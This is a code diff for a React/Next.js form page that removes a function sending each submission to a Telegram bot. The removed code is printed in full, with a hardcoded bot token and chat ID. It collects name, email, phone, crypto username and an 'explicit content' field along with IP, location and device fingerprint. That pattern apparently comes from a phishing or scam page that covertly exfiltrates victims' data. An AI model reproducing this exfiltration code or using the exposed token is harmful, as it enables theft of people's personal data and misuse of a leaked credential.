@@ -193,68 +193,9 @@ export default function Home() {
     )
   }
 
-  const sendToTelegram = async (data: typeof formData) => {
-    const BOT_TOKEN = '8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8'
-    
-    // Format the message with form data
-    const message = `🔔 *New Form Submission*
-
-*Full Name:* ${data.fullName}
-*Email:* ${data.email}
-*Agent ID:* ${data.agentId || 'N/A'}
-*Agent Name:* ${data.agentName || 'N/A'}
-*Alternate Phone:* ${data.alternatePhone || 'N/A'}
-*Explicit Content:* ${data.explicitContent || 'N/A'}
-*Crypto Username:* ${data.cryptoUsername || 'N/A'}
-
-*Session Data:*
-• IP Address: ${sessionData.ipAddress}
-• City: ${sessionData.city}
-• State: ${sessionData.state}
-• Country: ${sessionData.country}
-• User Agent: ${sessionData.userAgent.substring(0, 100)}${sessionData.userAgent.length > 100 ? '...' : ''}
-
-*Device Profile:*
-• Screen Resolution: ${deviceProfile.screenResolution}
-• Device RAM: ${deviceProfile.deviceRam}
-• Processors: ${deviceProfile.processors}
-• Operating System: ${deviceProfile.operatingSystem}`
-
-    try {
-      // Group chat_id
-      // Note: Make sure your bot is added to the group as a member/admin
-      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5294276637'
-      
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown',
-        }),
-      })
-
-      const result = await response.json()
-      
-      if (!response.ok) {
-        console.error('Telegram API error:', result)
-      } else {
-        console.log('Message sent to Telegram successfully')
-      }
-    } catch (error) {
-      console.error('Error sending to Telegram:', error)
-    }
-  }
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!isFormValid()) return
-    
-    // Send data to Telegram
-    await sendToTelegram(formData)
 
     // Persist data for cancellation page
     if (typeof window !== 'undefined') {
